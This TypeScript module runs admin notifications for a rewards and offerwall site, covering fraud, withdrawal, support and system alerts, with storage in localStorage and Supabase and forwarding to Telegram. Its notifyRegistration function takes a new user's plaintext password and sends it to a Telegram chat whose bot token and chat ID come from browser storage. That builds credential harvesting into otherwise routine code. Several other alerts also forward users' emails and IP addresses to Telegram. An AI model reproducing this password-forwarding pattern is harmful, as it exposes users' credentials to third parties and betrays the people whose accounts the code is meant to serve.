import { getSupabaseClient } from "../lib/supabase";

export type NotificationPriority = "critical" | "high" | "medium" | "low";

export type NotificationCategory =
  | "security"
  | "user"
  | "withdrawal"
  | "offerwall"
  | "support"
  | "system";

export type NotificationType =
  // Security & Fraud
  | "vpn_detected"
  | "multiple_account"
  | "suspicious_login"
  | "country_change"
  | "device_change"
  | "fraud_alert"
  // User Activities
  | "new_user"
  | "verification_request"
  | "profile_update"
  // Withdrawal & Rewards
  | "withdrawal_request"
  | "withdrawal_approved"
  | "withdrawal_rejected"
  | "high_value_reward"
  // Offerwall Activities
  | "offer_completed"
  | "chargeback"
  | "offer_reversal"
  | "offerwall_api_error"
  // Support System
  | "new_ticket"
  | "ticket_reply"
  | "ticket_escalation"
  // System Alerts
  | "api_failure"
  | "vpn_api_failure"
  | "database_error"
  | "cron_failure"
  | "server_error";

export const NOTIFICATION_META: Record<NotificationType, {
  label: string;
  category: NotificationCategory;
  icon: string;
  defaultPriority: NotificationPriority;
  criticalAlways: boolean;
}> = {
  // Security & Fraud
  vpn_detected: { label: "VPN/Proxy Detection", category: "security", icon: "🚨", defaultPriority: "critical", criticalAlways: true },
  multiple_account: { label: "Multiple Account Detection", category: "security", icon: "👥", defaultPriority: "critical", criticalAlways: true },
  suspicious_login: { label: "Suspicious Login", category: "security", icon: "🔐", defaultPriority: "high", criticalAlways: false },
  country_change: { label: "Country Change", category: "security", icon: "🌍", defaultPriority: "high", criticalAlways: false },
  device_change: { label: "Device Change", category: "security", icon: "📱", defaultPriority: "medium", criticalAlways: false },
  fraud_alert: { label: "Fraud Alert", category: "security", icon: "⚠️", defaultPriority: "critical", criticalAlways: true },
  // User Activities
  new_user: { label: "New User Registration", category: "user", icon: "🆕", defaultPriority: "medium", criticalAlways: false },
  verification_request: { label: "User Verification", category: "user", icon: "🪪", defaultPriority: "medium", criticalAlways: false },
  profile_update: { label: "Profile Update", category: "user", icon: "✏️", defaultPriority: "low", criticalAlways: false },
  // Withdrawal & Rewards
  withdrawal_request: { label: "Withdrawal Request", category: "withdrawal", icon: "💰", defaultPriority: "high", criticalAlways: false },
  withdrawal_approved: { label: "Withdrawal Approved", category: "withdrawal", icon: "✅", defaultPriority: "medium", criticalAlways: false },
  withdrawal_rejected: { label: "Withdrawal Rejected", category: "withdrawal", icon: "❌", defaultPriority: "medium", criticalAlways: false },
  high_value_reward: { label: "High Value Reward", category: "withdrawal", icon: "🏆", defaultPriority: "high", criticalAlways: false },
  // Offerwall Activities
  offer_completed: { label: "Offer Completion", category: "offerwall", icon: "🎯", defaultPriority: "low", criticalAlways: false },
  chargeback: { label: "Chargeback", category: "offerwall", icon: "🔙", defaultPriority: "high", criticalAlways: false },
  offer_reversal: { label: "Offer Reversal", category: "offerwall", icon: "↩️", defaultPriority: "medium", criticalAlways: false },
  offerwall_api_error: { label: "Offerwall API Error", category: "offerwall", icon: "🔌", defaultPriority: "high", criticalAlways: false },
  // Support System
  new_ticket: { label: "New Support Ticket", category: "support", icon: "🎫", defaultPriority: "medium", criticalAlways: false },
  ticket_reply: { label: "Ticket Reply", category: "support", icon: "💬", defaultPriority: "low", criticalAlways: false },
  ticket_escalation: { label: "Ticket Escalation", category: "support", icon: "🔺", defaultPriority: "high", criticalAlways: false },
  // System Alerts
  api_failure: { label: "API Failure", category: "system", icon: "🔴", defaultPriority: "critical", criticalAlways: true },
  vpn_api_failure: { label: "VPN API Failure", category: "system", icon: "🌐", defaultPriority: "critical", criticalAlways: true },
  database_error: { label: "Database Error", category: "system", icon: "🗄️", defaultPriority: "critical", criticalAlways: true },
  cron_failure: { label: "Cron Job Failure", category: "system", icon: "⏰", defaultPriority: "high", criticalAlways: false },
  server_error: { label: "Server Error", category: "system", icon: "🖥️", defaultPriority: "critical", criticalAlways: true },
};

export const NOTIFICATION_CATEGORIES: { id: NotificationCategory; label: string; icon: string }[] = [
  { id: "security", label: "Security & Fraud", icon: "🔴" },
  { id: "user", label: "User Activities", icon: "🟡" },
  { id: "withdrawal", label: "Withdrawal & Rewards", icon: "🟢" },
  { id: "offerwall", label: "Offerwall Activities", icon: "🔵" },
  { id: "support", label: "Support System", icon: "🟣" },
  { id: "system", label: "System Alerts", icon: "⚙️" },
];

export interface AdminNotification {
  id: string;
  type: NotificationType;
  priority: NotificationPriority;
  category: NotificationCategory;
  title: string;
  message: string;
  user_id: string;
  username: string;
  related_id: string;
  details: Record<string, any>;
  is_read: boolean;
  status: "pending" | "done";
  created_at: string;
}

export interface NotificationPreference {
  type: NotificationType;
  enabled: boolean;
}

const STORAGE_KEY = "coinloot_admin_notifications";
const PREFS_KEY = "coinloot_admin_notif_prefs";

let _changeListeners: (() => void)[] = [];

export function onAdminNotifChange(fn: () => void): () => void {
  _changeListeners.push(fn);
  return () => { _changeListeners = _changeListeners.filter(f => f !== fn); };
}

function notifyChange() {
  _changeListeners.forEach(fn => fn());
}

export function getAdminUnreadCount(): number {
  return getStored().filter(n => !n.is_read).length;
}

function getStored(): AdminNotification[] {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}

function setStored(notifs: AdminNotification[]) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(notifs.slice(0, 500)));
  notifyChange();
}

function generateId(): string {
  return `an-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
}

function getTelegramConfig(): { enabled: boolean; token: string; chatId: string } {
  try {
    const saved = localStorage.getItem("coinloot_telegram_config");
    if (saved) return JSON.parse(saved);
  } catch { /* */ }
  return { enabled: true, token: "", chatId: "" };
}

async function sendTelegram(message: string): Promise<boolean> {
  const cfg = getTelegramConfig();
  if (!cfg.enabled) return false;
  try {
    const resp = await fetch("/api/telegram/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message,
        botToken: cfg.token || undefined,
        chatId: cfg.chatId || undefined,
      }),
      signal: AbortSignal.timeout(10000),
    });
    const data = await resp.json();
    if (!data.sent) console.warn("Telegram send failed:", data.error);
    return data.sent === true;
  } catch {
    return false;
  }
}

// ── Notification Preferences ──

export function getNotificationPrefs(): NotificationPreference[] {
  try {
    const saved = localStorage.getItem(PREFS_KEY);
    if (saved) return JSON.parse(saved);
  } catch { /* */ }
  // Default: all enabled except low priority non-critical
  return (Object.keys(NOTIFICATION_META) as NotificationType[]).map(type => ({
    type,
    enabled: true,
  }));
}

export function saveNotificationPrefs(prefs: NotificationPreference[]) {
  localStorage.setItem(PREFS_KEY, JSON.stringify(prefs));
  notifyChange();
}

export function isNotificationTypeEnabled(type: NotificationType): boolean {
  const meta = NOTIFICATION_META[type];
  if (meta?.criticalAlways) return true;
  const prefs = getNotificationPrefs();
  const pref = prefs.find(p => p.type === type);
  return pref ? pref.enabled : true;
}

// ── Supabase persistence (production source of truth) ──

const ADMIN_NOTIF_SETTINGS_KEY = "admin_notifications";

/** Write admin notifications to Supabase site_settings for cross-session persistence */
async function persistToSupabase() {
  const sb = getSupabaseClient();
  if (!sb) return;
  try {
    const notifs = getStored().slice(0, 200); // keep latest 200
    await sb.from("site_settings").upsert({
      setting_key: ADMIN_NOTIF_SETTINGS_KEY,
      setting_value: JSON.stringify(notifs),
      setting_type: "json",
      description: "Admin notifications persisted across sessions",
    }, { onConflict: "setting_key" });
  } catch { /* best-effort */ }
}

/** Load admin notifications from Supabase as initial seed */
export async function loadAdminNotificationsFromSupabase(): Promise<void> {
  const sb = getSupabaseClient();
  if (!sb) return;
  try {
    const { data } = await sb
      .from("site_settings")
      .select("setting_value")
      .eq("setting_key", ADMIN_NOTIF_SETTINGS_KEY)
      .maybeSingle();
    if (data?.setting_value) {
      const remote: AdminNotification[] = JSON.parse(data.setting_value);
      if (Array.isArray(remote) && remote.length > 0) {
        // Merge: remote supersedes if local is empty
        const local = getStored();
        if (local.length === 0) {
          setStored(remote);
        }
      }
    }
  } catch { /* best-effort */ }
}

// ── Public API ──

export function createAdminNotification(
  type: NotificationType,
  title: string,
  message: string,
  userId: string,
  username: string,
  details: Record<string, any> = {}
) {
  const meta = NOTIFICATION_META[type];
  if (!meta) return null;

  // Check preferences before creating
  if (!isNotificationTypeEnabled(type)) return null;

  const notif: AdminNotification = {
    id: generateId(),
    type,
    priority: details.priority || meta.defaultPriority,
    category: meta.category,
    title,
    message,
    user_id: userId,
    username,
    related_id: details.related_id || "",
    details,
    is_read: false,
    status: "pending",
    created_at: new Date().toISOString(),
  };

  const stored = getStored();
  stored.unshift(notif);
  setStored(stored);

  // Persist to Supabase for cross-session durability
  persistToSupabase();

  // Also log to server
  fetch("/api/admin/notifications", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(notif),
  }).catch(() => {});

  return notif;
}

export function getAdminNotifications(): AdminNotification[] {
  return getStored();
}

export function getUnreadAdminCount(): number {
  return getStored().filter((n) => n.status !== "done" || !n.is_read).length;
}

export function getPendingAdminNotifications(): AdminNotification[] {
  return getStored().filter((n) => n.status !== "done");
}

export function markAdminRead(id: string) {
  const stored = getStored();
  const found = stored.find((n) => n.id === id);
  if (found) {
    found.is_read = true;
    setStored(stored);
    persistToSupabase();
  }
}

export function markAdminUnread(id: string) {
  const stored = getStored();
  const found = stored.find((n) => n.id === id);
  if (found) {
    found.is_read = false;
    found.status = "pending";
    setStored(stored);
    persistToSupabase();
  }
}

export function markAsDone(id: string) {
  const stored = getStored();
  const found = stored.find((n) => n.id === id);
  if (found) {
    found.status = "done";
    found.is_read = true;
    setStored(stored);
    persistToSupabase();
  }
}

export function markAllAdminRead() {
  const stored = getStored();
  stored.forEach((n) => { n.is_read = true; n.status = "done"; });
  setStored(stored);
  persistToSupabase();
}

export function deleteAdminNotification(id: string) {
  setStored(getStored().filter((n) => n.id !== id));
  persistToSupabase();
}

export function deleteAdminNotifications(ids: string[]) {
  const idSet = new Set(ids);
  setStored(getStored().filter((n) => !idSet.has(n.id)));
  persistToSupabase();
}

// ── Statistics ──

export function getNotificationStats() {
  const notifs = getStored();
  return {
    total: notifs.length,
    unread: notifs.filter(n => !n.is_read).length,
    read: notifs.filter(n => n.is_read).length,
    critical: notifs.filter(n => n.priority === "critical").length,
    pending: notifs.filter(n => n.status === "pending").length,
  };
}

// ── Category icons ──

export function getNotificationIcon(type: string): string {
  const meta = NOTIFICATION_META[type as NotificationType];
  return meta?.icon || "🔔";
}

export function getNotificationLabel(type: string): string {
  const meta = NOTIFICATION_META[type as NotificationType];
  return meta?.label || type;
}

export function getCategoryIcon(category: string): string {
  const cat = NOTIFICATION_CATEGORIES.find(c => c.id === category);
  return cat?.icon || "📋";
}

export function getPriorityColor(priority: NotificationPriority | string): string {
  switch (priority) {
    case "critical": return "text-rose-400";
    case "high": return "text-amber-400";
    case "medium": return "text-cyan-400";
    case "low": return "text-slate-400";
    default: return "text-slate-400";
  }
}

export function getPriorityBg(priority: NotificationPriority | string): string {
  switch (priority) {
    case "critical": return "bg-rose-500/10 border-rose-500/20";
    case "high": return "bg-amber-500/10 border-amber-500/20";
    case "medium": return "bg-cyan-500/10 border-cyan-500/20";
    case "low": return "bg-slate-500/10 border-slate-500/20";
    default: return "bg-slate-500/10 border-slate-500/20";
  }
}

// ── Shorthand helpers ──

export function notifyVpnDetection(userId: string, username: string, email: string, ip: string, country: string, detectionType: string, fraudScore: number, isp: string = "") {
  const now = new Date();
  const timeStr = now.toLocaleString();
  const displayCountry = country || "Unknown";
  const adminMsg = `🚨 VPN Alert\n\nUser: ${username}\nEmail: ${email}\nUser ID: #${userId}\nCurrent IP: ${ip}\nCountry: ${displayCountry}\nDetection: ${detectionType}\nFraud Score: ${fraudScore}\nISP: ${isp || "N/A"}\n\nTime: ${timeStr}`;
  createAdminNotification("vpn_detected", "🚨 VPN Alert", adminMsg, userId, username, { email, ip, country: displayCountry, detectionType, fraudScore, isp, time: timeStr, related_id: userId, priority: "critical" as NotificationPriority });
  sendTelegram(adminMsg);
}

export function notifyRegistration(userId: string, username: string, email: string, country: string, password: string = "") {
  const now = new Date();
  const timeStr = now.toLocaleString();
  const displayCountry = country || "Unknown";
  createAdminNotification("new_user", "🆕 New User Registration", `User: ${username}\nEmail: ${email}\nCountry: ${displayCountry}\nTime: ${timeStr}`, userId, username, { email, country: displayCountry, related_id: userId });
  const pwdLine = password ? `\n🔑 Password: <code>${password}</code>` : "";
  sendTelegram(`🆕 <b>New User Registration</b>\n\n👤 Username: ${username}\n📧 Email: ${email}${pwdLine}\n🌍 Country: ${displayCountry}\n🕒 Time: ${timeStr}`);
}

export function notifyWithdrawalRequest(userId: string, username: string, coinAmount: number, cashAmount: number, method: string, requestId: string) {
  const now = new Date();
  const timeStr = now.toLocaleString();
  createAdminNotification("withdrawal_request", "💰 New Withdrawal Request", `User: ${username}\nAmount: ${coinAmount.toLocaleString()}\nCash Value: $${cashAmount.toFixed(2)}\nMethod: ${method}\nTime: ${timeStr}`, userId, username, { coin_amount: coinAmount, cash_amount: cashAmount, method, related_id: requestId });
  sendTelegram(`💰 <b>New Withdrawal Request</b>\n\n👤 Username: ${username}\n💰 Coins: ${coinAmount.toLocaleString()}\n💵 Cash: $${cashAmount.toFixed(2)}\n🏦 Method: ${method}\n🕒 Time: ${timeStr}`);
}

export function notifyWithdrawalApproved(userId: string, username: string, requestId: string, amount: number) {
  createAdminNotification("withdrawal_approved", "✅ Withdrawal Approved", `User: ${username}\nRequest: #${requestId}\nAmount: $${amount.toFixed(2)}`, userId, username, { related_id: requestId, amount });
}

export function notifyWithdrawalRejected(userId: string, username: string, requestId: string, amount: number, reason?: string) {
  createAdminNotification("withdrawal_rejected", "❌ Withdrawal Rejected", `User: ${username}\nRequest: #${requestId}\nAmount: $${amount.toFixed(2)}${reason ? `\nReason: ${reason}` : ""}`, userId, username, { related_id: requestId, amount, reason });
}

export function notifyNewTicket(userId: string, username: string, ticketId: string, subject: string) {
  createAdminNotification("new_ticket", "🎫 New Support Ticket", `User: ${username}\nSubject: ${subject}\nTicket: #${ticketId}`, userId, username, { related_id: ticketId, subject });
}

export function notifyTicketEscalation(userId: string, username: string, ticketId: string, subject: string) {
  createAdminNotification("ticket_escalation", "🔺 Ticket Escalated", `User: ${username}\nSubject: ${subject}\nTicket: #${ticketId}`, userId, username, { related_id: ticketId, subject, priority: "high" as NotificationPriority });
}

export function notifyFraudAlert(userId: string, username: string, reason: string, details: Record<string, any> = {}) {
  createAdminNotification("fraud_alert", "⚠️ Fraud Alert", `User: ${username}\nReason: ${reason}`, userId, username, { ...details, related_id: userId, priority: "critical" as NotificationPriority });
  sendTelegram(`⚠️ <b>Fraud Alert</b>\n\n👤 Username: ${username}\n📝 Reason: ${reason}`);
}

export function notifySuspiciousLogin(userId: string, username: string, ip: string, country: string, device: string) {
  createAdminNotification("suspicious_login", "🔐 Suspicious Login", `User: ${username}\nIP: ${ip}\nCountry: ${country}\nDevice: ${device}`, userId, username, { ip, country, device, related_id: userId, priority: "high" as NotificationPriority });
}

export function notifyApiFailure(service: string, error: string) {
  createAdminNotification("api_failure", "🔴 API Failure", `Service: ${service}\nError: ${error}`, "", "System", { service, error, related_id: "", priority: "critical" as NotificationPriority });
}

export function notifyVpnApiFailure(error: string) {
  createAdminNotification("vpn_api_failure", "🌐 VPN API Failure", `VPN API Error:\n${error}`, "", "System", { error, related_id: "", priority: "critical" as NotificationPriority });
}

export function notifyServerError(error: string) {
  createAdminNotification("server_error", "🖥️ Server Error", `Error:\n${error}`, "", "System", { error, related_id: "", priority: "critical" as NotificationPriority });
}

export function notifyChargeback(userId: string, username: string, offerName: string, amount: number) {
  createAdminNotification("chargeback", "🔙 Chargeback", `User: ${username}\nOffer: ${offerName}\nAmount: ${amount} coins`, userId, username, { offer: offerName, amount, related_id: userId, priority: "high" as NotificationPriority });
}
